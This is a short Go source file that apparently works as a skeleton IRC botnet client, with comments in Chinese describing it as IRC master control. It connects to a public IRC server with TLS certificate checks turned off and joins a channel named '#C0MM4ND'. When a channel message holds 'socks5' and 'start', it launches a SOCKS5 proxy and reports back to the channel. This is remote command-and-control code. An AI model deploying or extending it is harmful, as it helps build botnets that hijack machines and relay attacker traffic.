package main

import (
	"crypto/tls"
	"fmt"
	"strings"
	socks5 "github.com/armon/go-socks5"
	irc "github.com/thoj/go-ircevent"
)

// Switches
var socks5Switch = false

// Socks5 Socks5代理服务器扩展
func Socks5() {
	fmt.Println("Run Socks5")
	conf := &socks5.Config{}
	server, err := socks5.New(conf)
	if err != nil {
		panic(err)
	}

	err = server.ListenAndServe("tcp", "127.0.0.1:8000")
	// Create SOCKS5 proxy on localhost port 8000
	if err != nil {
		panic(err)
	}

}

func solvePrimsg(e *irc.Event, irccon *irc.Connection, channel string) {
	// e.Nick()
	message := e.Message()
	if strings.Contains(message, "socks5") && strings.Contains(message, "start"){
		if socks5Switch != true {
			irccon.Privmsg(channel, "开始启动SOCKS5服务\n")
			go Socks5()
			socks5Switch = true
			irccon.Privmsg(channel, "完成启动SOCKS5服务\n")
		}		
	} 

	
}

//main IRC主控(在线状态)
func main() {
	const serverssl = "irc.freenode.net:7000"
	

	fmt.Println("Run Irc")
	fullname := "Test Bot 89757"

	nick := "Bot89757"
	channel := "#C0MM4ND"

	irccon := irc.IRC(nick, fullname)
	defer irccon.Quit()
	irccon.VerboseCallbackHandler = false
	irccon.Debug = false
	irccon.UseTLS = true
	irccon.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	irccon.AddCallback("001", func(e *irc.Event) {
		irccon.Join(channel)
	})

	irccon.AddCallback("366", func(e *irc.Event) {
		irccon.Privmsg(channel, "Joined in.\n")
	})

	irccon.AddCallback("PRIVMSG", func(e *irc.Event) {
		// channame := e.Arguments[0]
		// nick := e.Nick
		// message := e.Message()
		fmt.Println("Received:", e.Message(), " from ", e.Nick)
		// if strings.HasPrefix(channame, "#") {
		// }
		solvePrimsg(e, irccon, channel)

	})

	err := irccon.Connect(serverssl)

	if err != nil {
		fmt.Println(err)
		irccon.Quit()
		return
	}

	irccon.Loop()

}
